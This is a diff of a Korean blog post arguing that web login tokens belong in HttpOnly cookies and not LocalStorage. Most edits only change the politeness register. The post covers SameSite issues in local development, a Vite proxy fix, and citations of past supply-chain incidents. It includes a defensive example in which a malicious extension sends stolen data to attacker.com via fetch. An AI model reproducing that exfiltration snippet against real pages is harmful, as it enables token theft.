@@ -31,10 +31,10 @@ series: "Joying"
 
 "JWT 토큰 어디에 저장할까?"
 
-팀원 중 한 명이 "그냥 LocalStorage에 넣으면 되는 거 아니야?"라고 했어요.
-나도 처음엔 그렇게 생각했거든요. 간단하고 쉬우니까.
+팀원 중 한 명이 "그냥 LocalStorage에 넣으면 되는 거 아니야?"라고 했습니다.
+나도 처음엔 그렇게 생각했습니다. 간단하고 쉬우니까.
 
-근데 찾아보니까 큰일날 뻔했어요.
+근데 찾아보니까 큰일날 뻔했습니다.
 
 ---
 
@@ -86,7 +86,7 @@ AngularJS, Backbone.js 시대
 - 초기 Spotify API
 - GitHub API
 
-당시엔 이게 정석이었다고 해요.
+당시엔 이게 정석이었다고 합니다.
 
 > 출처: [OWASP - Token Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html), [Auth0 Documentation - Token Storage](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)
 
@@ -208,15 +208,15 @@ AngularJS, Backbone.js 시대
 ![](/uploads/project/Joying/jwt-cookie-security/localstorage.svg)
 
 
-솔직히 처음엔 이게 제일 간단해 보였어요. 구현도 쉽고, CORS 설정만 해주면 되고, 모바일 앱이랑 같은 방식이니까 통일성도 있고. RESTful API 철학에도 딱 맞아떨어지죠.
+솔직히 처음엔 이게 제일 간단해 보였습니다. 구현도 쉽고, CORS 설정만 해주면 되고, 모바일 앱이랑 같은 방식이니까 통일성도 있습니다. RESTful API 철학에도 딱 맞아떨어집니다.
 
-근데 문제는 **보안**이에요. JavaScript로 접근 가능하다는 게 생각보다 훨씬 위험했어요. 악성 스크립트가 실행되면 토큰이 그대로 탈취돼요. 브라우저가 제공하는 보안 기능도 전혀 활용할 수 없고, 토큰 만료나 갱신 로직도 200줄 넘게 직접 짜야 해요.
+근데 문제는 보안입니다. JavaScript로 접근 가능하다는 게 생각보다 훨씬 위험했습니다. 악성 스크립트가 실행되면 토큰이 그대로 탈취됩니다. 브라우저가 제공하는 보안 기능도 전혀 활용할 수 없고, 토큰 만료나 갱신 로직도 200줄 넘게 직접 짜야 합니다.
 
 #### 실제 사고 사례
 
 **2022년 2월 - Discord 토큰 탈취 npm 패키지 25개 발견**
 
-npm 패키지에 악성 코드가 포함되어 localStorage의 Discord 토큰을 탈취했어요.
+npm 패키지에 악성 코드가 포함되어 localStorage의 Discord 토큰을 탈취했습니다.
 - colors.js, discord.js 등 유명 패키지 위장
 - iframe을 통해 localStorage 접근
 - 수백만 개발자 영향
@@ -239,11 +239,11 @@ npm 패키지에 악성 코드가 포함되어 localStorage의 Discord 토큰을
 ![](/uploads/project/Joying/jwt-cookie-security/plain-cookie.svg)
 
 
-쿠키의 만료 시간 자동 관리나 Domain, Path 제한 같은 기능은 쓸 수 있어서 LocalStorage보단 낫다고 볼 수 있어요.
+쿠키의 만료 시간 자동 관리나 Domain, Path 제한 같은 기능은 쓸 수 있어서 LocalStorage보단 낫다고 볼 수 있습니다.
 
-하지만 **핵심 문제는 그대로**예요. `document.cookie`로 접근 가능하면 XSS 공격에 그대로 노출되거든요. LocalStorage랑 보안 수준이 똑같아요. 게다가 쿠키는 자동 전송이 안 되니까 매번 헤더에 직접 넣어줘야 해요. 쿠키의 진짜 장점을 활용도 못 하는 셈이죠.
+하지만 핵심 문제는 그대로입니다. `document.cookie`로 접근 가능하면 XSS 공격에 그대로 노출됩니다. LocalStorage랑 보안 수준이 똑같습니다. 게다가 쿠키는 자동 전송이 안 되니까 매번 헤더에 직접 넣어줘야 합니다. 쿠키의 진짜 장점을 활용도 못 하는 셈입니다.
 
-결론: LocalStorage의 단점 + Cookie의 복잡함 = 최악의 조합
+LocalStorage의 단점 + Cookie의 복잡함 = 최악의 조합
 
 ---
 
@@ -256,11 +256,11 @@ npm 패키지에 악성 코드가 포함되어 localStorage의 Discord 토큰을
 ![](/uploads/project/Joying/jwt-cookie-security/httponly-cookie-2.svg)
 
 
-이게 진짜예요. JavaScript에서 `document.cookie`로 접근하려고 해도 빈 문자열만 반환돼요. XSS 공격이 완전히 막히죠. 브라우저가 알아서 쿠키를 전송해주고, SameSite로 CSRF 방어도 되고, 만료 시간도 자동으로 관리돼요. 프론트엔드 코드는 10줄이면 끝나요.
+이게 진짜입니다. JavaScript에서 `document.cookie`로 접근하려고 해도 빈 문자열만 반환됩니다. XSS 공격이 완전히 막힙니다. 브라우저가 알아서 쿠키를 전송해주고, SameSite로 CSRF 방어도 되고, 만료 시간도 자동으로 관리됩니다. 프론트엔드 코드는 10줄이면 끝납니다.
 
-국내외 대형 서비스들이 이 방식을 표준으로 쓰고 있어요.
+국내외 대형 서비스들이 이 방식을 표준으로 쓰고 있습니다.
 
-다만 **로컬 개발할 때 SameSite 정책 때문에 문제가 생겨요**(뒤에서 설명). CORS 설정도 credentials 옵션을 켜야 하고, 쿠키 용량도 4KB 제한이 있습니다. 서버 간 통신에는 적합하지 않아요.
+다만 로컬 개발할 때 SameSite 정책 때문에 문제가 생깁니다(뒤에서 설명). CORS 설정도 credentials 옵션을 켜야 하고, 쿠키 용량도 4KB 제한이 있습니다. 서버 간 통신에는 적합하지 않습니다.
 
 ---
 
@@ -271,9 +271,9 @@ npm 패키지에 악성 코드가 포함되어 localStorage의 Discord 토큰을
 ![](/uploads/project/Joying/jwt-cookie-security/httponly-cookie-3.svg)
 
 
-HttpOnly의 보안과 Authorization 헤더의 유연성을 둘 다 가져가려는 방식이에요. 마이크로서비스 간 토큰 전달이 쉽고, API Gateway와도 호환성이 좋습니다. 레거시 시스템 통합할 때도 편해요.
+HttpOnly의 보안과 Authorization 헤더의 유연성을 둘 다 가져가려는 방식입니다. 마이크로서비스 간 토큰 전달이 쉽고, API Gateway와도 호환성이 좋습니다. 레거시 시스템 통합할 때도 편합니다.
 
-다만 구현이 복잡해요. 쿠키와 헤더를 둘 다 관리해야 하고, 디버깅할 때도 헷갈려요. 웬만하면 오버엔지니어링이에요.
+다만 구현이 복잡합니다. 쿠키와 헤더를 둘 다 관리해야 하고, 디버깅할 때도 헷갈립니다. 웬만하면 오버엔지니어링입니다.
 
 마이크로서비스 아키텍처에서 가끔 쓰긴 하는데, 우리 프로젝트처럼 단일 서버 구조면 필요 없습니다.
 
@@ -299,13 +299,13 @@ HttpOnly의 보안과 Authorization 헤더의 유연성을 둘 다 가져가려�
 
 ### 1. 보안이 최우선
 
-XSS 공격 하나면 게임 끝이에요.
+XSS 공격 하나면 게임 끝입니다.
 - 2022년 npm 패키지 공격: 수백만 개발자 영향
 - 2021년 ua-parser-js 침해: 주간 700만 다운로드 패키지
 
 HttpOnly는 JavaScript 접근 자체가 불가능합니다.
 
-### 2. 코드가 간결해요
+### 2. 코드가 간결합니다
 
 200줄 vs 10줄. 버그 발생 가능성도 20배 차이.
 
@@ -317,7 +317,7 @@ Cookie: NID_AUT (인증), NID_SES (세션)
 NID_AUT: HttpOnly 설정됨 ✓
 ```
 
-네이버는 NID_AUT 쿠키에 HttpOnly 속성을 설정해서 JavaScript 접근을 차단해요. 로그인 프로세스에서 NID_AUT, NID_JKL, NID_SES 쿠키가 생성되며, 이 중 민감한 인증 정보를 담는 NID_AUT만 HttpOnly로 보호합니다.
+네이버는 NID_AUT 쿠키에 HttpOnly 속성을 설정해서 JavaScript 접근을 차단합니다. 로그인 프로세스에서 NID_AUT, NID_JKL, NID_SES 쿠키가 생성되며, 이 중 민감한 인증 정보를 담는 NID_AUT만 HttpOnly로 보호합니다.
 
 > 출처: [SMJ Blog - 쿠키, 세션](https://smjeon.dev/etc/cookie-session/), [Minystory - requests로 네이버 스마트스토어센터 로그인 구현하기](https://minyeamer.github.io/blog/smartstore-login-3/)
 
@@ -328,7 +328,7 @@ HSID: HttpOnly 설정됨 ✓
 유효기간: 2년
 ```
 
-구글은 HSID 쿠키를 HTTPOnly로 설정해서 스크립트나 사용자가 수정할 수 없게 해요. SID와 HSID는 사용자의 Google 계정 ID와 로그인 시간을 암호화해서 저장하며, 이를 통해 폼 제출 공격을 차단합니다.
+구글은 HSID 쿠키를 HTTPOnly로 설정해서 스크립트나 사용자가 수정할 수 없게 합니다. SID와 HSID는 사용자의 Google 계정 ID와 로그인 시간을 암호화해서 저장하며, 이를 통해 폼 제출 공격을 차단합니다.
 
 > 출처: [Stack Overflow - SID and HSID cookies](https://stackoverflow.com/questions/39205434/sid-and-hsid-cookies-what-are-they-uses), [Evgenii Studitskikh - Understanding Google's Cookies](https://evgeniistuditskikh.com/code/understanding-googles-cookies-the-hidden-passport-behind-every-login/)
 
@@ -339,11 +339,11 @@ __Host prefix 사용 ✓
 HttpOnly, Secure 설정됨 ✓
 ```
 
-GitHub은 user_session 쿠키에 `__Host` prefix를 사용해서 쿠키 토싱(Cookie Tossing) 공격을 방어해요. HttpOnly와 Secure 플래그를 함께 설정해서 JavaScript 접근 차단과 HTTPS 전송만 허용합니다.
+GitHub은 user_session 쿠키에 `__Host` prefix를 사용해서 쿠키 토싱(Cookie Tossing) 공격을 방어합니다. HttpOnly와 Secure 플래그를 함께 설정해서 JavaScript 접근 차단과 HTTPS 전송만 허용합니다.
 
 > 출처: [GitHub Blog - Yummy cookies across domains](https://github.blog/engineering/infrastructure/yummy-cookies-across-domains/), [Codegram - Secure GitHub OAuth with cookies](https://www.codegram.com/blog/secure-github-oauth-with-cookies/)
 
-현업 표준이에요.
+현업 표준입니다.
 
 > 추가 출처: [GDSC UOS - JWT HTTPS Cookie 사용한 보안 로그인](https://gdsc-university-of-seoul.github.io/Login-by-JWT-HTTPS-COOKIE/), [OWASP - LocalStorage vs Cookies Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
 
@@ -351,7 +351,7 @@ GitHub은 user_session 쿠키에 `__Host` prefix를 사용해서 쿠키 토싱(C
 
 ## 그런데 문제가 생겼다
 
-백엔드 구현 끝내고 운영 서버에 배포했어요. 완벽하게 작동했습니다.
+백엔드 구현 끝내고 운영 서버에 배포했습니다. 완벽하게 작동했습니다.
 
 근데 로컬에서 개발하려고 하니까...
 
@@ -363,7 +363,7 @@ const response = await axiosInstance.get('/api/v1/auth/me');
 // → 401 Unauthorized
 ```
 
-카카오 로그인도 성공했고, 개발자 도구에서 쿠키도 보이는데 401이 떴어요.
+카카오 로그인도 성공했고, 개발자 도구에서 쿠키도 보이는데 401이 떴습니다.
 
 ```
 localhost:5173 → https://------.-.-------.io/api/v1/auth/me
@@ -379,7 +379,7 @@ https://------.-.-------.io → https://------.-.-------.io/api/v1/auth/me
 
 ## 범인은 SameSite 쿠키 정책
 
-Chrome DevTools로 확인해봤어요.
+Chrome DevTools로 확인해봤습니다.
 
 ### Application 탭
 
@@ -409,7 +409,7 @@ CSRF 공격 막으려고 브라우저가 쿠키 전송을 제한하는 정책.
 | **Lax** | 같은 도메인 + 안전한 GET 요청 |
 | **None** | 크로스 사이트도 허용 (Secure 필수) |
 
-우리는 `SameSite=Lax`로 설정했어요.
+우리는 `SameSite=Lax`로 설정했습니다.
 
 ```java
 cookie.setAttribute("SameSite", "Lax");
@@ -450,11 +450,11 @@ cookie.setAttribute("SameSite", "None");
 cookie.setSecure(true);
 ```
 
-프론트 코드 안 고치고 백엔드만 한 줄 바꾸면 끝이니까 제일 쉬워 보여요.
+프론트 코드 안 고치고 백엔드만 한 줄 바꾸면 끝이니까 제일 쉬워 보입니다.
 
-근데 생각해보면 이건 **운영 환경 보안을 낮추는 거**예요. 로컬 개발 편의 때문에 실제 사용자 보안을 희생하는 건 말이 안 돼요. CSRF 공격 위험도 증가하고요.
+근데 생각해보면 이건 운영 환경 보안을 낮추는 것입니다. 로컬 개발 편의 때문에 실제 사용자 보안을 희생하는 건 말이 안 됩니다. CSRF 공격 위험도 증가합니다.
 
-HttpOnly 선택한 이유가 보안인데, 이건 본말전도예요. **선택 안 함.**
+HttpOnly 선택한 이유가 보안인데, 이건 본말전도입니다. 선택 안 함.
 
 ---
 
@@ -465,11 +465,11 @@ mkcert localhost
 # https://localhost:5173
 ```
 
-운영 환경이랑 똑같이 만들자는 아이디어예요.
+운영 환경이랑 똑같이 만들자는 아이디어입니다.
 
-근데 **프로토콜만 맞춰도 의미가 없어요**. 도메인이 다르면 (`localhost` ≠ `------.-.-------.io`) 여전히 크로스 사이트거든요. 인증서도 매번 관리해야 하고, 팀원 전부 설정해야 합니다.
+근데 프로토콜만 맞춰도 의미가 없습니다. 도메인이 다르면 (`localhost` ≠ `------.-.-------.io`) 여전히 크로스 사이트입니다. 인증서도 매번 관리해야 하고, 팀원 전부 설정해야 합니다.
 
-HTTPS로 바꿔도 결국 차단돼요. **선택 안 함.**
+HTTPS로 바꿔도 결국 차단됩니다. 선택 안 함.
 
 ---
 
@@ -481,9 +481,9 @@ localStorage.setItem('accessToken', token);
 
 SameSite는 무관하니까 해결은 되겠지.
 
-근데 이러면 **XSS 취약점이 부활**해요. 200줄 코드 다시 작성해야 하고, OAuth2 전부 수정해야 하고, HttpOnly 선택한 이유를 포기하는 거예요.
+근데 이러면 XSS 취약점이 부활합니다. 200줄 코드 다시 작성해야 하고, OAuth2 전부 수정해야 하고, HttpOnly 선택한 이유를 포기하는 것입니다.
 
-**절대 안 함.** 원점 회귀.
+절대 안 함. 원점 회귀.
 
 ---
 
@@ -499,7 +499,7 @@ SameSite는 무관하니까 해결은 되겠지.
 
 브라우저는 `localhost:5173`으로 요청 → 퍼스트 파티!
 
-백엔드 코드는 전혀 안 건드려요. 보안 설정도 그대로 유지되고요. 프론트만 수정하면 끝이에요. 개발 서버에서만 작동하고 운영은 Nginx가 처리하는 구조라, 환경 분리도 깔끔합니다.
+백엔드 코드는 전혀 안 건드립니다. 보안 설정도 그대로 유지됩니다. 프론트만 수정하면 끝입니다. 개발 서버에서만 작동하고 운영은 Nginx가 처리하는 구조라, 환경 분리도 깔끔합니다.
 
 > 출처: [Vite - Server Proxy 공식 문서](https://vitejs.dev/config/server-options.html#server-proxy), [velog - Vite 프록시 설정](https://velog.io/@seowj0710/Cookie-SameSite-%EC%84%A4%EC%A0%95%ED%95%98%EA%B8%B0)
 
@@ -602,7 +602,7 @@ https://------.-.-------.io/api/v1 (백엔드)
 
 ## 그래도 Authorization 헤더가 필요한 경우
 
-웹에서는 HttpOnly Cookie가 최선이지만, 이런 경우는 헤더가 적합해요.
+웹에서는 HttpOnly Cookie가 최선이지만, 이런 경우는 헤더가 적합합니다.
 
 ### 1. 모바일 네이티브 앱
 
@@ -669,7 +669,7 @@ gh api /user -H "Authorization: Bearer $TOKEN"
 
 ## 현실적인 선택: 하이브리드
 
-대부분의 현대 서비스는 상황에 따라 다르게 사용해요.
+대부분의 현대 서비스는 상황에 따라 다르게 사용합니다.
 
 | 클라이언트 | 저장 방식 | 전송 방식 |
 |:---:|:---:|:---:|
@@ -686,7 +686,7 @@ gh api /user -H "Authorization: Bearer $TOKEN"
 - **GitHub CLI**: OAuth Token (헤더)
 - **GitHub Actions**: `GITHUB_TOKEN` 환경 변수 (헤더)
 
-GitHub은 웹 브라우저 인증에 HttpOnly 쿠키를 사용하지만, API나 CLI 도구에서는 Authorization 헤더를 사용해요.
+GitHub은 웹 브라우저 인증에 HttpOnly 쿠키를 사용하지만, API나 CLI 도구에서는 Authorization 헤더를 사용합니다.
 
 > 출처: [GitHub Blog - Yummy cookies across domains](https://github.blog/engineering/infrastructure/yummy-cookies-across-domains/)
 
@@ -707,7 +707,7 @@ GitHub은 웹 브라우저 인증에 HttpOnly 쿠키를 사용하지만, API나 
 - **SDK**: Credentials file (`~/.aws/credentials`)
 - **EC2/Lambda**: IAM Role (임시 토큰, 헤더)
 
-AWS는 Console 웹 인터페이스에서 쿠키를 사용하지만, CLI와 SDK는 모두 헤더 기반 인증을 사용해요. AWS Security Blog에서 API Gateway에 HttpOnly Cookie 인증 구현을 공식 권장합니다.
+AWS는 Console 웹 인터페이스에서 쿠키를 사용하지만, CLI와 SDK는 모두 헤더 기반 인증을 사용합니다. AWS Security Blog에서 API Gateway에 HttpOnly Cookie 인증 구현을 공식 권장합니다.
 
 > 출처: [AWS Security Blog - HttpOnly Cookie Authentication in API Gateway](https://aws.amazon.com/blogs/security/reduce-risk-by-implementing-httponly-cookie-authentication-in-amazon-api-gateway/)
 
@@ -787,13 +787,13 @@ proxy: {
 
 ## (2025년 11월 9일 댓글을 보고 수정했습니다.) 근데 단순하게... XSS 공격만 막으면 되는 거 아닌가?
 
-여기까지 읽고 나면 이런 생각이 들 수 있어요.
+여기까지 읽고 나면 이런 생각이 들 수 있습니다.
 
 **"그냥 XSS 공격을 완벽하게 막으면 HttpOnly Cookie 안 써도 되는 거 아니야?"**
 
-맞는 말이에요. XSS만 막으면 LocalStorage도 안전하긴 합니다.
+맞는 말입니다. XSS만 막으면 LocalStorage도 안전하긴 합니다.
 
-근데 **현실적으로 XSS를 완벽하게 막는 건 거의 불가능**해요.
+근데 현실적으로 XSS를 완벽하게 막는 건 거의 불가능합니다.
 
 ### XSS를 완전히 막을 수 없는 이유
 
@@ -816,7 +816,7 @@ npm list --all | wc -l
 - 악성 버전 배포 (4시간 동안)
 - 토큰 탈취 코드 포함
 
-우리가 아무리 코드를 잘 짜도, **신뢰했던 라이브러리가 악성 코드를 실행하면 끝**이에요.
+우리가 아무리 코드를 잘 짜도, 신뢰했던 라이브러리가 악성 코드를 실행하면 끝입니다.
 
 > 출처: [CISA - Malware Discovered in ua-parser-js](https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js), [Rapid7 - ua-parser-js Hijacked](https://www.rapid7.com/blog/post/2021/10/25/npm-library-ua-parser-js-hijacked-what-you-need-to-know/)
 
@@ -829,7 +829,7 @@ npm list --all | wc -l
 
 #### 2. 브라우저 확장 프로그램
 
-사용자가 설치한 Chrome/Firefox 확장 프로그램도 페이지의 JavaScript에 접근할 수 있어요.
+사용자가 설치한 Chrome/Firefox 확장 프로그램도 페이지의 JavaScript에 접근할 수 있습니다.
 
 ```javascript
 // 악성 확장 프로그램이 실행하는 코드
@@ -840,7 +840,7 @@ fetch('https://attacker.com/steal', {
 });
 ```
 
-이것도 **서비스 개발자가 통제할 수 없는 영역**이에요.
+이것도 서비스 개발자가 통제할 수 없는 영역입니다.
 
 실제로 2018년 British Airways 공격도 서드파티 스크립트가 침해당한 사례였습니다.
 
@@ -855,13 +855,13 @@ fetch('https://attacker.com/steal', {
 - 서드파티 스크립트 (Google Analytics, 광고 SDK 등)의 취약점
 - React/Vue 같은 프레임워크의 버그
 
-실제로 OWASP Top 10에서 XSS가 계속 상위권에 있는 이유가, **완벽하게 방어하기가 거의 불가능**하기 때문이에요.
+실제로 OWASP Top 10에서 XSS가 계속 상위권에 있는 이유가, 완벽하게 방어하기가 거의 불가능하기 때문입니다.
 
 > 출처: [OWASP - XSS (Cross Site Scripting)](https://owasp.org/www-community/attacks/xss/), [SK쉴더스 - XSS 공격 유형부터 보안대책까지](https://www.skshieldus.com/blog-security/security-trend-idx-06)
 
 ### HttpOnly는 "만약의 경우"를 대비한 방어층
 
-보안의 핵심 원칙은 **Defense in Depth (다층 방어)**예요.
+보안의 핵심 원칙은 Defense in Depth(다층 방어)입니다.
 
 ```
 1차 방어: XSS 공격 자체를 막는다 (CSP, 입력 검증, escape 등)
@@ -869,7 +869,7 @@ fetch('https://attacker.com/steal', {
 3차 방어: 토큰이 탈취되어도 피해를 최소화 (짧은 만료시간, IP 검증 등)
 ```
 
-**HttpOnly Cookie는 2차 방어선**이에요.
+HttpOnly Cookie는 2차 방어선입니다.
 
 LocalStorage에 저장하면:
 - XSS 공격 성공 → 토큰 즉시 탈취 → 게임 오버
@@ -881,46 +881,46 @@ HttpOnly Cookie에 저장하면:
 
 ### 실제 대기업들의 선택
 
-네이버, 카카오, 쿠팡, 토스 같은 회사들도 당연히 XSS 방어를 해요.
+네이버, 카카오, 쿠팡, 토스 같은 회사들도 당연히 XSS 방어를 합니다.
 
-근데 **그와 동시에** HttpOnly Cookie도 써요.
+근데 그와 동시에 HttpOnly Cookie도 씁니다.
 
-왜? **XSS 방어만으로는 충분하지 않다는 걸 알기 때문**이에요.
+왜? XSS 방어만으로는 충분하지 않다는 걸 알기 때문입니다.
 
 보안팀이 아무리 잘해도:
 - 신입 개발자가 실수할 수 있다
 - 서드파티 라이브러리가 침해당할 수 있다
 - 새로운 취약점이 발견될 수 있다
 
-그래서 **XSS 방어 + HttpOnly Cookie**를 둘 다 해요.
+그래서 XSS 방어 + HttpOnly Cookie를 둘 다 합니다.
 
-비용도 거의 없거든요. 백엔드 설정 3줄, 프론트 설정 2줄이면 끝이에요.
+비용도 거의 없습니다. 백엔드 설정 3줄, 프론트 설정 2줄이면 끝입니다.
 
 ### 결론: 둘 다 필요하다
 
-"XSS만 막으면 된다"는 **이론적으로는 맞지만 현실적으로 불가능**해요.
+"XSS만 막으면 된다"는 이론적으로는 맞지만 현실적으로 불가능합니다.
 
 실무에서는:
 
 1. **XSS 공격을 최대한 막는다** (CSP, 입력 검증, escape 등)
-2. **동시에** HttpOnly Cookie로 토큰을 격리해요
-3. 만료 시간, IP 검증 등 추가 방어층도 구축해요
+2. 동시에 HttpOnly Cookie로 토큰을 격리합니다
+3. 만료 시간, IP 검증 등 추가 방어층도 구축합니다
 
-보안은 "하나만 잘하면 된다"가 아니라 **"여러 겹의 방어막"**을 쌓는 거예요.
+보안은 한 가지 방어에 기대지 않고 여러 겹의 방어막을 쌓는 일입니다.
 
-HttpOnly는 그 중 하나의 중요한 층이고, **비용 대비 효과가 가장 큰 방어 수단** 중 하나에요.
+HttpOnly는 그 중 하나의 중요한 층이고, 비용 대비 효과가 가장 큰 방어 수단 중 하나입니다.
 
 그래서 OWASP, Google, Microsoft 같은 곳에서 모두 "HttpOnly Cookie에 저장하라"고 권고하는 겁니다.
 
-**XSS 방어와 HttpOnly는 둘 다 필요해요.**
+XSS 방어와 HttpOnly는 둘 다 필요합니다.
 
 ---
 
 ## 마치며
 
-처음엔 "그냥 LocalStorage 쓰면 되지 않아?"라고 생각했어요. 찾아보니 다 이유가 있었습니다. 2012년엔 LocalStorage가 정답이었지만, XSS 공격과 npm 공급망 공격이 현실이 된 지금은 **토큰을 JavaScript에서 격리하는 게 핵심**이에요.
+처음엔 "그냥 LocalStorage 쓰면 되지 않아?"라고 생각했습니다. 찾아보니 다 이유가 있었습니다. 2012년엔 LocalStorage가 정답이었지만, XSS 공격과 npm 공급망 공격이 현실이 된 지금은 토큰을 JavaScript에서 격리하는 게 핵심입니다.
 
-결국 웹 보안의 원칙은 격리예요. HttpOnly로 JavaScript와 격리하고, SameSite로 크로스 사이트 요청을 격리하고, Secure로 HTTP 전송을 격리합니다. 웹은 HttpOnly Cookie, 모바일은 Secure Storage, 서버 간 통신은 환경 변수 — 각 환경의 특성에 맞게 토큰을 격리하는 게 중요해요.
+결국 웹 보안의 원칙은 격리입니다. HttpOnly로 JavaScript와 격리하고, SameSite로 크로스 사이트 요청을 격리하고, Secure로 HTTP 전송을 격리합니다. 웹은 HttpOnly Cookie, 모바일은 Secure Storage, 서버 간 통신은 환경 변수를 씁니다. 각 환경의 특성에 맞게 토큰을 격리하는 게 중요합니다.
 
 ---
 
